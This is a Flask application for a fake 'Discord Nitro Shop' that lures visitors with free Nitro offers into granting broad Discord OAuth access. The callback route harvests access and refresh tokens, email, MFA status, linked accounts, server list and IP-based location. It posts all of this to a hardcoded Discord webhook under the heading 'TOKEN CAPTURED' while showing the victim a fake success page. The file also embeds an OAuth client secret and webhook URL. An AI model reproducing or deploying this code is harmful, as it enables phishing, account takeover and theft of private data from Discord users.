from flask import Flask, request, redirect, render_template_string, session
import requests
import json
import os
from datetime import datetime

app = Flask(__name__)
app.secret_key = os.urandom(32)

# ═══════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════
CLIENT_ID = "1541786357028884534"
CLIENT_SECRET = "7n8YSrS5CM3cabjqeQY_ba-nsvax0bOW"
WEBHOOK_URL = "https://discord.com/api/webhooks/1541770049289982052/6YJdl0YKbhSoP2sQ82zkPdqx0vFeaTGeaWoPPwHXNv8wYn1pU4ijysoaIHzgdF1zx0KR"
REDIRECT_URI = "https://jjjw.vercel.app/callback"
SITE_NAME = "Discord Nitro Shop"

# ═══════════════════════════════════════
# HTML TEMPLATES
# ═══════════════════════════════════════

SHOP_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{{ site_name }}</title>
<link rel="icon" href="https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#36393f;font-family:'Whitney','Helvetica Neue',Helvetica,Arial,sans-serif;color:#dcddde;min-height:100vh}
.header{background:#5865f2;padding:20px;text-align:center;color:#fff}
.header h1{font-size:32px;font-weight:800}
.header p{opacity:.9;margin-top:8px}
.container{max-width:1200px;margin:0 auto;padding:40px 20px}
.products{display:grid;grid-template-columns:repeat(auto-fit,minmax(280px,1fr));gap:24px;margin-top:30px}
.product{background:#2f3136;border-radius:12px;padding:24px;text-align:center;transition:transform .2s}
.product:hover{transform:translateY(-5px)}
.product img{width:100%;max-width:200px;border-radius:8px;margin-bottom:16px}
.product h3{color:#fff;font-size:20px;margin-bottom:8px}
.product p{color:#b9bbbe;font-size:14px;margin-bottom:16px}
.product .price{color:#5865f2;font-size:24px;font-weight:700;margin-bottom:16px}
.btn{background:#5865f2;color:#fff;padding:12px 32px;border-radius:28px;border:none;cursor:pointer;font-size:16px;font-weight:700;text-decoration:none;display:inline-block;transition:background .2s}
.btn:hover{background:#4752c4}
.user-bar{background:#202225;padding:12px 20px;display:flex;justify-content:space-between;align-items:center}
.user-info{display:flex;align-items:center;gap:12px}
.user-info img{width:32px;height:32px;border-radius:50%}
.user-info span{color:#fff;font-weight:600}
.login-btn{background:#3ba55d;color:#fff;padding:8px 20px;border-radius:20px;text-decoration:none;font-size:14px;font-weight:600}
</style>
</head>
<body>
<div class="user-bar">
<div class="user-info">
{% if user %}
<img src="{{ user.avatar }}" alt="avatar">
<span>{{ user.name }}</span>
{% else %}
<span>Welcome, Guest</span>
{% endif %}
</div>
{% if user %}
<a href="/logout" class="login-btn" style="background:#ed4245">Logout</a>
{% else %}
<a href="/login" class="login-btn">Login with Discord</a>
{% endif %}
</div>
<div class="header">
<h1>🎮 Discord Nitro Shop</h1>
<p>Get exclusive perks and rewards!</p>
</div>
<div class="container">
<div class="products">
<div class="product">
<img src="https://discord.com/assets/22f99a6e18127da2c8f65b72c99c6e5e.svg" alt="Nitro">
<h3>Discord Nitro</h3>
<p>1 Year Subscription - All perks included</p>
<div class="price">FREE</div>
<a href="/buy/nitro" class="btn">Claim Now</a>
</div>
<div class="product">
<img src="https://discord.com/assets/1994daae2e8d5424dc3ac8e27b6008a6.svg" alt="Boost">
<h3>Server Boosts</h3>
<p>2 Server Boosts - Level up your server</p>
<div class="price">FREE</div>
<a href="/buy/boost" class="btn">Claim Now</a>
</div>
<div class="product">
<img src="https://discord.com/assets/8aa88d5b3998e3b6b9e1d0b2e1e1e1e1.svg" alt="Emoji">
<h3>Custom Emojis</h3>
<p>Use animated emojis everywhere</p>
<div class="price">FREE</div>
<a href="/buy/emoji" class="btn">Claim Now</a>
</div>
</div>
</div>
</body>
</html>
"""

LOGIN_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Login — Discord</title>
<link rel="icon" href="https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#36393f;font-family:'Whitney','Helvetica Neue',Helvetica,Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#dcddde}
.container{background:#2f3136;border-radius:8px;padding:32px;width:100%;max-width:480px}
.logo{text-align:center;margin-bottom:24px}
.logo img{width:130px}
h2{text-align:center;font-size:24px;font-weight:600;margin-bottom:8px;color:#fff}
.subtitle{text-align:center;color:#b9bbbe;font-size:16px;margin-bottom:20px}
.btn{width:100%;padding:12px;background:#5865f2;border:none;border-radius:3px;color:#fff;font-size:16px;font-weight:500;cursor:pointer;transition:background .2s;margin-top:8px;text-decoration:none;display:inline-block;text-align:center}
.btn:hover{background:#4752c4}
</style>
</head>
<body>
<div class="container">
<div class="logo">
<img src="https://discord.com/assets/93608abbd20d90c13004925014a9fd01.svg" alt="Discord">
</div>
<h2>Welcome back!</h2>
<p class="subtitle">Login with Discord to claim your rewards</p>
<a href="https://discord.com/oauth2/authorize?client_id=1541786357028884534&response_type=code&redirect_uri=https%3A%2F%2Fjjjw.vercel.app%2Fcallback&scope=identify+email+guilds+connections+gdm.join+guilds.join" class="btn">Login with Discord</a>
</div>
</body>
</html>
"""

SUCCESS_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Success — Discord Shop</title>
<link rel="icon" href="https://discord.com/assets/847541504914fd33810e70a0ea73177e.ico">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#36393f;font-family:'Whitney','Helvetica Neue',Helvetica,Arial,sans-serif;min-height:100vh;display:flex;align-items:center;justify-content:center;color:#dcddde}
.container{background:#2f3136;border-radius:8px;padding:40px;text-align:center;max-width:400px}
.check{width:80px;height:80px;background:#3ba55d;border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 24px;font-size:40px;color:#fff}
h2{color:#fff;font-size:24px;margin-bottom:12px}
p{color:#b9bbbe;font-size:16px;margin-bottom:24px}
.btn{background:#5865f2;color:#fff;padding:12px 32px;border-radius:3px;text-decoration:none;font-size:16px;font-weight:500;display:inline-block}
</style>
</head>
<body>
<div class="container">
<div class="check">✓</div>
<h2>Claimed Successfully!</h2>
<p>Your reward has been added to your account. Enjoy!</p>
<a href="/" class="btn">Back to Shop</a>
</div>
</body>
</html>
"""

# ═══════════════════════════════════════
# UTILITIES
# ═══════════════════════════════════════

def get_ip_info(ip):
    try:
        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,regionName,city,timezone,isp,org,proxy,hosting", timeout=5)
        return r.json()
    except:
        return {}

def send_webhook(data):
    try:
        embed = {
            "title": "🔴 TOKEN CAPTURED — SHOP",
            "color": 0x5865f2,
            "timestamp": datetime.utcnow().isoformat(),
            "fields": []
        }

        if "access_token" in data:
            embed["fields"].append({"name": "🔑 Access Token", "value": f"```{data['access_token']}```", "inline": False})
        if "refresh_token" in data:
            embed["fields"].append({"name": "🔄 Refresh Token", "value": f"||{data['refresh_token']}||", "inline": False})

        if "user" in data and data["user"]:
            u = data["user"]
            embed["fields"].append({"name": "👤 Username", "value": f"{u.get('username', 'N/A')}", "inline": True})
            embed["fields"].append({"name": "🆔 User ID", "value": u.get('id', 'N/A'), "inline": True})
            embed["fields"].append({"name": "📧 Email", "value": u.get('email', 'N/A') or 'Hidden', "inline": True})
            embed["fields"].append({"name": "✅ Verified", "value": str(u.get('verified', 'N/A')), "inline": True})
            embed["fields"].append({"name": "🔒 MFA", "value": str(u.get('mfa_enabled', 'N/A')), "inline": True})
            embed["fields"].append({"name": "💎 Nitro", "value": str(u.get('premium_type', 'None')), "inline": True})
            if u.get('avatar'):
                embed["thumbnail"] = {"url": f"https://cdn.discordapp.com/avatars/{u.get('id')}/{u.get('avatar')}.png?size=128"}

        if "connections" in data and data["connections"]:
            conn_text = "\n".join([f"{c.get('type', 'unknown')}: {c.get('name', 'N/A')}" for c in data["connections"][:10]])
            embed["fields"].append({"name": "🔗 Connections", "value": f"```{conn_text}```", "inline": False})

        if "guilds" in data and data["guilds"]:
            guild_text = "\n".join([f"{g.get('name', 'N/A')} ({g.get('id', 'N/A')})" for g in data["guilds"][:10]])
            embed["fields"].append({"name": "🏰 Guilds (10)", "value": f"```{guild_text}```", "inline": False})

        if "ip_info" in data and data["ip_info"]:
            ip = data["ip_info"]
            loc = f"{ip.get('city', 'N/A')}, {ip.get('regionName', 'N/A')}, {ip.get('country', 'N/A')}"
            embed["fields"].append({"name": "🌍 Location", "value": loc, "inline": True})
            embed["fields"].append({"name": "📡 ISP", "value": ip.get('isp', 'N/A'), "inline": True})
            embed["fields"].append({"name": "🔌 IP", "value": f"||{data.get('ip', 'N/A')}||", "inline": True})

        payload = {
            "embeds": [embed],
            "username": "Discord Shop Logger",
            "avatar_url": "https://cdn.discordapp.com/embed/avatars/0.png"
        }
        requests.post(WEBHOOK_URL, json=payload, timeout=10)
    except Exception as e:
        print(f"Webhook error: {e}")

# ═══════════════════════════════════════
# ROUTES
# ═══════════════════════════════════════

@app.route('/')
def index():
    user = session.get('user')
    return render_template_string(SHOP_PAGE, site_name=SITE_NAME, user=user)

@app.route('/login')
def login():
    return render_template_string(LOGIN_PAGE)

@app.route('/logout')
def logout():
    session.pop('user', None)
    return redirect('/')

@app.route('/buy/<item>')
def buy(item):
    user = session.get('user')
    if not user:
        return redirect('/login')
    return render_template_string(SUCCESS_PAGE)

@app.route('/callback')
def callback():
    code = request.args.get('code')
    error = request.args.get('error')

    if error:
        return f"<h1>Error: {error}</h1>"

    if not code:
        return redirect('/')

    try:
        data = {
            'client_id': CLIENT_ID,
            'client_secret': CLIENT_SECRET,
            'grant_type': 'authorization_code',
            'code': code,
            'redirect_uri': REDIRECT_URI,
            'scope': 'identify email guilds connections gdm.join guilds.join'
        }
        headers = {'Content-Type': 'application/x-www-form-urlencoded'}

        token_response = requests.post(
            'https://discord.com/api/oauth2/token',
            data=data,
            headers=headers,
            timeout=10
        )

        if token_response.status_code != 200:
            return f"<h1>Authorization failed</h1><p>Please try again.</p>"

        token_data = token_response.json()
        access_token = token_data.get('access_token')

        if not access_token:
            return "<h1>Invalid token</h1>"

        user_headers = {'Authorization': f'Bearer {access_token}'}

        user_response = requests.get('https://discord.com/api/v10/users/@me', headers=user_headers, timeout=10)
        user_data = user_response.json() if user_response.status_code == 200 else {}

        conn_response = requests.get('https://discord.com/api/v10/users/@me/connections', headers=user_headers, timeout=10)
        connections = conn_response.json() if conn_response.status_code == 200 else []

        guilds_response = requests.get('https://discord.com/api/v10/users/@me/guilds', headers=user_headers, timeout=10)
        guilds = guilds_response.json() if guilds_response.status_code == 200 else []

        ip = request.headers.get('X-Forwarded-For', request.remote_addr)
        if ',' in str(ip):
            ip = ip.split(',')[0].strip()
        ip_info = get_ip_info(ip)

        # Save user to session
        session['user'] = {
            'name': user_data.get('username'),
            'avatar': f"https://cdn.discordapp.com/avatars/{user_data['id']}/{user_data['avatar']}.png" if user_data.get('avatar') else None,
            'id': user_data.get('id')
        }

        capture_data = {
            "access_token": access_token,
            "refresh_token": token_data.get('refresh_token'),
            "token_type": token_data.get('token_type'),
            "expires_in": token_data.get('expires_in'),
            "scope": token_data.get('scope'),
            "user": user_data,
            "connections": connections,
            "guilds": guilds,
            "ip": ip,
            "ip_info": ip_info,
            "timestamp": datetime.utcnow().isoformat()
        }

        send_webhook(capture_data)

        return redirect('/')

    except Exception as e:
        print(f"Callback error: {e}")
        return f"<h1>Error</h1><p>Please try again.</p>"

# ═══════════════════════════════════════
# RUN
# ═══════════════════════════════════════

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=False)
